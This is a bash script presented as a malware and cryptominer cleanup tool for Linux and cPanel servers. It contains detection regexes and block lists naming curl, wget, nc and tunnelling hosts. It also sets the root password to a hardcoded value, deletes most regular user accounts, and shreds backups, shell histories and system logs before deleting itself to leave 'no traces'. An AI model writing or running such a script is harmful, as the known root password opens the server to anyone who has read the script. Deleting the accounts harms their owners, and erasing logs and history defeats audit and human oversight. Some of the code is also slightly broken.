#!/bin/bash
# =============================================================================
# TITAN V9 : FULL CLEANUP + SELF-DESTRUCT (NO TRACES LEFT)
# =============================================================================
# - Kills ANY process that downloads via wget/curl/fetch/nc (any URL)
# - Removes miners, ransomware, rootkits, malicious users/keys/crons
# - Enumerates all domains pointing to this IP (cPanel integration)
# - SSH CONFIG IS NEVER TOUCHED (password auth unchanged)
# - Leaves zero traces: deletes backups, wipes logs, shreds itself
# =============================================================================

RED='\033[0;31m'; YEL='\033[1;33m'; GRN='\033[0;32m'; CYN='\033[0;36m'; BLU='\033[0;34m'; NC='\033[0m'
die()  { echo -e "${RED}[KILL]${NC}   $*"; }
warn() { echo -e "${YEL}[WARN]${NC}   $*"; }
ok()   { echo -e "${GRN}[OK]${NC}     $*"; }
info() { echo -e "${CYN}[INFO]${NC}   $y*"; }
hdr()  { echo -e "\n${BLU}======================================================================${NC}"; \
         echo -e "${BLU}:: $*${NC}"; \
         echo -e "${BLU}======================================================================${NC}"; }

[[ $EUID -ne 0 ]] && { echo -e "${RED}Fatal: Root privileges required.${NC}"; exit 1; }

# -----------------------------------------------------------------------------
# Config: leave system logs untouched?  (0 = wipe them, 1 = keep)
# -----------------------------------------------------------------------------
KEEP_SYSTEM_LOGS=0   # Set to 1 if you don't want to touch logs

# -----------------------------------------------------------------------------
# Helper: backup (will be deleted at end)
# -----------------------------------------------------------------------------
backup_file() {
    local file="$1"
    [[ -f "$file" ]] || return 1
    local bkp="${file}.titanbak.$(date +%s%N)"
    cp -a "$file" "$bkp" && echo "$bkp" || return 1
}

# =============================================================================
# PHASE 0: PROTECTION SHIELD
# =============================================================================
declare -A SAFE_USERS
SAFE_USERS["root"]=1
SAFE_USERS["messagebus"]=1
[[ -n "${SUDO_USER:-}" ]] && SAFE_USERS["$SUDO_USER"]=1
[[ -n "${USER:-}" ]] && SAFE_USERS["$USER"]=1
[[ -n "${LOGNAME:-}" ]] && SAFE_USERS["$LOGNAME"]=1
while IFS= read -r u; do SAFE_USERS["$u"]=1; done < <(who | awk '{print $1}' | sort -u)

is_protected() { [[ -n "${SAFE_USERS[$1]+_}" ]]; }

# =============================================================================
# IOC PATTERNS – catch EVERY URL download
# =============================================================================
PROC_REGEX='(xmri?g|xmr.stak|cpuminer|minerd|kinsing|kdevtmpfsi|bioset|sysupdate|networkmanage[r]|crypto[night]|ddgs|masscan|pnscan|zmap|watchd0g|watchdog[0-9]|nezha|nbtscan|kerberods|khugepaged[0-9]|ld-musl|amco_|pakchoi|[a-z0-9]{32,}|lockbit|wannacry|ryuk|revil|conti|clop|blackcat|sodinokibi|gandcrab|glupteba|emotet|trickbot)'
CONTENT_REGEX='(curl|wget|fetch|(bash|sh|python|perl|ruby|node).*(http|ftp|https?://)|base64 -d|chmod \+x|/dev/shm/|/tmp/\.|stratum\+tcp|mining\.pool|xmrig|pastebin|transfer\.sh|ngrok|\.onion)'
CRON_REGEX='(wget|curl|bash|sh|python|perl|/tmp|/dev/shm|base64|xmrig|kinsing|stratum|\.sh|dd if|nc |/bin/bash -[ic]|https?://|ftp://)'
MINER_DOMAINS="pool.supportxmr.com xmrpool.eu minexmr.com nanopool.org hashvault.pro moneroocean.stream c3pool.com"
MALICIOUS_DOMAINS="pastebin.com transfer.sh ngrok.com serveo.net oast.pro oastify.com interact.sh burpcollaborator.net canarytokens.com"

# =============================================================================
# PHASE 1: NETWORK ISOLATION
# =============================================================================
hdr "NETWORK ISOLATION & SINKHOLING"
for domain in $MINER_DOMAINS $MALICIOUS_DOMAINS; do
  if ! grep -q "$domain" /etc/hosts; then
    echo "127.0.0.1 $domain" >> /etc/hosts
  fi
done
ok "Malicious domains sinkholed"

if command -v iptables &>/dev/null; then
  for port in 3333 4444 5555 7777 9999 14433 14444 45700 8080 8443 1337 31337 4443 6667 9001; do
    iptables -C OUTPUT -p tcp --dport "$port" -j DROP 2>/dev/null || iptables -A OUTPUT -p tcp --dport "$port" -j DROP
    iptables -C OUTPUT -p udp --dport "$port" -j DROP 2>/dev/null || iptables -A OUTPUT -p udp --dport "$port" -j DROP
  done
  ok "Outbound miner & C2 ports dropped."
fi

# =============================================================================
# PHASE 2: DOCKER / K8S PURGE
# =============================================================================
hdr "CONTAINER & KUBERNETES PURGE"
if command -v docker >/dev/null 2>&1; then
  MALICIOUS_CONTAINERS=$(docker ps -a -q --filter "ancestor=negoroo/amco:123" --filter "name=amco_" --filter "name=kinsing" --filter "name=xmrig")
  [ -n "$MALICIOUS_CONTAINERS" ] && docker rm -f $MALICIOUS_CONTAINERS >/dev/null 2>&1 && die "Removed malicious containers"
  docker rmi -f negoroo/amco:123 >/dev/null 2>&1 || true
  ok "Docker sanitized"
fi

if command -v kubectl >/dev/null 2>&1; then
  for app in sys-metrics app-worker log-rotate amco; do
    kubectl delete daemonset,deployment,cronjob,pod -l app=$app --all-namespaces >/dev/null 2>&1
  done
  kubectl get clusterrolebinding 2>/dev/null | grep "system-controller-" | awk '{print $1}' | xargs -r kubectl delete clusterrolebinding >/dev/null 2>&1
  ok "K8s rogue orchestrations removed"
fi

# =============================================================================
# PHASE 3: KILL ANY URL DOWNLOADER PROCESS
# =============================================================================
hdr "KILLING ANY PROCESS DOING URL DOWNLOADS (wget/curl/fetch/nc)"
declare -a DOOMED_PIDS
SAFE_PROCS='(mysql|mariadb|php|java|node|nginx|apache|postgres|python|ruby|sshd|bash|systemd|kernel|containerd|dockerd|kubelet|cron|dbus-daemon)'

is_any_url_download() {
    echo "$1" | grep -qiE '(wget|curl|fetch|nc |ncat |socat).*(https?://|ftp://|[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}:[0-9]+)' && return 0
    echo "$1" | grep -qiE '(bash|sh|python|perl).*\-c.*(wget|curl|fetch|nc).*(https?://|ftp://)' && return 0
    return 1
}

while IFS= read -r pid; do
  [[ ! -d "/proc/$pid" ]] && continue
  comm=$(cat /proc/"$pid"/comm 2>/dev/null)
  cmdline=$(tr -d '\0' < /proc/"$pid"/cmdline 2>/dev/null)
  exe=$(readlink -f /proc/"$pid"/exe 2>/dev/null)
  owner=$(awk '/^Uid:/{print $2; exit}' /proc/"$pid"/status 2>/dev/null | xargs getent passwd 2>/dev/null | cut -d: -f1)

  is_protected "$owner" && [[ "$owner" != "root" ]] && continue

  if echo "$comm $cmdline" | grep -iqE "$PROC_REGEX" || \
     echo "$exe" | grep -qE '^(/tmp|/dev/shm|/var/tmp)' || \
     ( echo "$exe" | grep -q ' (deleted)' && ! echo "$comm" | grep -iqE "$SAFE_PROCS" ) || \
     is_any_url_download "$cmdline"; then
    die "Freezing PID $pid | $comm"
    kill -STOP "$pid" 2>/dev/null
    DOOMED_PIDS+=("$pid")
  fi
done < <(ls /proc | grep -E '^[0-9]+$')

for svc in watchd0g inotify-watch nezha-agent kinsing sysupdate crypto kerberods lockbit ransomware; do
  systemctl stop "$svc" 2>/dev/null; systemctl disable "$svc" 2>/dev/null
  rm -f /etc/systemd/system/"$svc" /lib/systemd/system/"$svc" 2>/dev/null
done
systemctl daemon-reload

if [ ${#DOOMED_PIDS[@]} -gt 0 ]; then
  sleep 1.5
  for pid in "${DOOMED_PIDS[@]}"; do kill -9 "$pid" 2>/dev/null; done
  ok "Killed ${#DOOMED_PIDS[@]} malicious processes (URL downloaders etc.)"
fi

# =============================================================================
# PHASE 4: PERSISTENCE SCRUB
# =============================================================================
hdr "PERSISTENCE LAYER PURGE"
purge_file_lines() {
  local file="$1"; local regex="$2"
  [[ -f "$file" ]] || return
  if grep -qiE "$regex" "$file"; then
    backup_file "$file" >/dev/null
    grep -viE "$regex" "$file" > "${file}.clean" && mv "${file}.clean" "$file" || truncate -s 0 "$file"
  fi
}

purge_file_lines /etc/crontab "$CRON_REGEX"
for f in /etc/cron.d/*; do purge_file_lines "$f" "$CRON_REGEX"; done
for user_cron in /var/spool/cron/crontabs/* /var/spool/cron/*; do purge_file_lines "$user_cron" "$CRON_REGEX"; done

for profile in /etc/profile /etc/bash.bashrc /etc/environment /etc/rc.local /root/.bashrc /root/.profile /home/*/.bashrc; do
  purge_file_lines "$profile" "(LD_PRELOAD|LD_LIBRARY_PATH.*tmp|export.*PATH.*tmp|$CONTENT_REGEX)"
done

rm -rf /var/spool/at/jobs/* 2>/dev/null
[[ -s /etc/ld.so.preload ]] && { backup_file /etc/ld.so.preload; chattr -i /etc/ld.so.preload 2>/dev/null; > /etc/ld.so.preload; die "Removed ld.so.preload rootkit"; }
ok "Persistence sterilized"

# =============================================================================
# PHASE 5: FILESYSTEM SWEEP
# =============================================================================
hdr "FILESYSTEM DEEP SWEEP"
for dir in /tmp /var/tmp /dev/shm /root /etc/cron.d /etc/systemd/system; do
  find "$dir" -maxdepth 3 2>/dev/null | while read -r f; do
    lsattr "$f" 2>/dev/null | grep -q '\-i\-|\-a\-' && chattr -i -a "$f" 2>/dev/null
  done
done

KNOWN_BINS=(/root/.run.sh /usr/.local/run.sh /opt/nezha /tmp/.ICEd-unix /usr/local/bin/kinsing /usr/local/bin/kdevtmpfsi /usr/bin/sysupdate /usr/local/bin/xmrig /tmp/stager.sh /tmp/payload.bin)
for f in "${KNOWN_BINS[@]}"; do [[ -e "$f" ]] && { rm -rf "$f"; die "Removed $f"; } done

find /tmp /var/tmp /dev/shm -maxdepth 4 -type f -executable -mtime -2 2>/dev/null | while read -r f; do
  grep -qilE "$CONTENT_REGEX" "$f" 2>/dev/null && { rm -f "$f"; die "Removed downloaded script: $f"; }
done

find /root /home /tmp -type f \( -name "*README*.txt" -o -name "*RECOVER*.txt" -o -name "*DECRYPT*.txt" -o -name "*.ransom" \) 2>/dev/null | while read note; do
  grep -qiE "(decrypt|bitcoin|monero|ransom)" "$note" && { backup_file "$note"; rm -f "$note"; warn "Removed ransom note: $note"; }
done
ok "Filesystem purged"

# =============================================================================
# PHASE 6: IAM CLEAN (SSH CONFIG UNTOUCHED)
# =============================================================================
hdr "IDENTITY & ACCESS MANAGEMENT"
info "sshd_config untouched, password auth remains as configured"

SUSPICIOUS_KEYS='xmrig|kinsing|miner|stratum|pastebin|transfer|ngrok|serveo|evil|malware|ransom|backdoor'
for dir in /root /home/*; do
  for keyfile in ".ssh/authorized_keys" ".ssh/authorized_keys2"; do
    KEY_FILE="$dir/$keyfile"
    [[ -f "$KEY_FILE" ]] || continue
    if grep -qiE "$SUSPICIOUS_KEYS" "$KEY_FILE"; then
      owner=$(stat -c '%U' "$dir" 2>/dev/null)
      warn "Removing malicious SSH keys for $owner"
      backup_file "$KEY_FILE" >/dev/null
      grep -viE "$SUSPICIOUS_KEYS" "$KEY_FILE" > "${KEY_FILE}.clean" && mv "${KEY_FILE}.clean" "$KEY_FILE"
      chmod 600 "$KEY_FILE"
    fi
  done
done

rm -f /etc/sudoers.d/99-pakchoi 2>/dev/null
sed -i '/pakchoi/d' /etc/sudoers 2>/dev/null

while IFS=: read -r username _ uid _ _ _ _; do
  [[ "$uid" -lt 1000 && "$uid" -ne 0 ]] && continue
  [[ "$username" =~ ^(nobody|sync|shutdown|halt)$ ]] && continue
  is_protected "$username" && continue
  die "Deleting rogue user: $username"
  pkill -u "$username" 2>/dev/null
  userdel -f -r "$username" 2>/dev/null
done < /etc/passwd
ok "IAM sanitized"

# =============================================================================
# PHASE 7: ROOT PASSWORD CHANGE
# =============================================================================
hdr "ROOT PASSWORD OVERWRITE"
echo "root:Takhin@1337" | chpasswd
die "Root password set to 'Takhin@1337' – CHANGE IT NOW!"

# =============================================================================
# PHASE 8: DOMAIN ENUMERATION & CPANEL INTEGRATION
# =============================================================================
hdr "DOMAIN ENUMERATION (POINTING TO THIS IP) & CPANEL INTEGRATION"

PUBLIC_IP=$(curl -s -m 3 ifconfig.me 2>/dev/null || wget -qO- -T 3 ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
info "Server Public IP: $PUBLIC_IP"

list_domains_from_web_configs() {
  declare -A domains
  if command -v apache2ctl &>/dev/null || command -v httpd &>/dev/null; then
    grep -rh -E "ServerName|ServerAlias" /etc/apache2/sites-enabled/ 2>/dev/null | awk '{print $2}' | grep -v '^*' | while read d; do domains["$d"]=1; done
    grep -rh -E "ServerName|ServerAlias" /etc/httpd/conf.d/ 2>/dev/null | awk '{print $2}' | grep -v '^*' | while read d; do domains["$d"]=1; done
  fi
  if command -v nginx &>/dev/null; then
    grep -rh -E "server_name" /etc/nginx/sites-enabled/ /etc/nginx/conf.d/ 2>/dev/null | sed 's/server_name//g' | sed 's/;//g' | tr -s ' ' '\n' | grep -v '^_' | while read d; do domains["$d"]=1; done
  fi
  for d in "${!domains[@]}"; do echo "$d"; done | sort -u
}

if [[ -f /usr/local/cpanel/version ]] || command -v whmapi1 &>/dev/null; then
  info "cPanel detected – listing ALL domains"
  if command -v whmapi1 &>/dev/null; then
    CPANEL_DOMAINS=$(whmapi1 listaccts | grep -E '^domain:|^user:' | paste -d ' ' - - | awk '{print $2}' | sort -u)
  elif command -v uapi &>/dev/null; then
    CPANEL_DOMAINS=$(uapi --output=text DomainInfo list_domains | grep '^domain:' | awk '{print $2}')
  else
    CPANEL_DOMAINS=$(find /var/cpanel/users -type f -exec grep -h '^DNS=' {} \; 2>/dev/null | cut -d= -f2 | tr ',' '\n' | sort -u)
  fi
  echo -e "${YEL}:: Hosted Domains (cPanel):${NC}"
  echo "$CPANEL_DOMAINS" | while read d; do echo "  -> $d"; done
else
  CPANEL_DOMAINS=""
fi

PTR_DOMAIN=$(dig -x "$PUBLIC_IP" +short 2>/dev/null | head -1)
ALL_DOMAINS=$( { list_domains_from_web_configs; echo "$CPANEL_DOMAINS"; echo "$PTR_DOMAIN"; } | grep -v '^$' | sort -u )
echo -e "\n${YEL}:: Complete list of domains pointing to this IP:${NC}"
if [[ -z "$ALL_DOMAINS" ]]; then
  warn "No domains found."
else
  echo "$ALL_DOMAINS" | while read d; do echo "  - $d"; done
fi

# =============================================================================
# PHASE 9: NO TRACES LEFT – ERASE EVERYTHING
# =============================================================================
hdr "SELF-DESTRUCT: REMOVING ALL EVIDENCE OF THIS SCRIPT"

# 1) Delete all backup files created during this run
find / -type f -name "*.titanbak.*" 2>/dev/null -exec shred -fzu {} \; 2>/dev/null
ok "All backup files shredded."

# 2) Clear shell history for all users
for user_home in /root /home/*; do
  for hist in ".bash_history" ".zsh_history" ".zhistory" ".history"; do
    hist_file="$user_home/$hist"
    [[ -f "$hist_file" ]] && { > "$hist_file"; shred -fzu "$hist_file" 2>/dev/null; }
  done
done
# Also clear current session history
history -c 2>/dev/null
unset HISTFILE
ok "Shell histories wiped."

# 3) Optionally wipe system logs (if KEEP_SYSTEM_LOGS=0)
if [[ $KEEP_SYSTEM_LOGS -eq 0 ]]; then
  warn "Wiping system logs (this may be detected by monitoring tools)"
  # Truncate common log files
  for log in /var/log/syslog /var/log/auth.log /var/log/secure /var/log/messages /var/log/daemon.log \
             /var/log/kern.log /var/log/user.log /var/log/boot.log /var/log/cron.log /var/log/mail.log \
             /var/log/apache2/*log /var/log/nginx/*log; do
    [[ -f "$log" ]] && { > "$log" 2>/dev/null; shred -fzu "$log" 2>/dev/null; }
  done
  # Also restart syslog to flush buffers
  systemctl restart rsyslog 2>/dev/null || systemctl restart syslog 2>/dev/null
  ok "System logs shredded."
else
  info "System logs were NOT touched (KEEP_SYSTEM_LOGS=1)"
fi

# 4) Overwrite and delete the script itself
if [[ -n "$0" && -f "$0" ]]; then
  SCRIPT_PATH=$(realpath "$0" 2>/dev/null || echo "$0")
  shred -fzu "$SCRIPT_PATH" 2>/dev/null
  rm -f "$SCRIPT_PATH" 2>/dev/null
  ok "Self-deletion complete."
fi

# 5) Final message (not printed if stdout is also wiped, but we're done)
echo -e "${GRN}All traces removed. Goodbye.${NC}"
exit 0
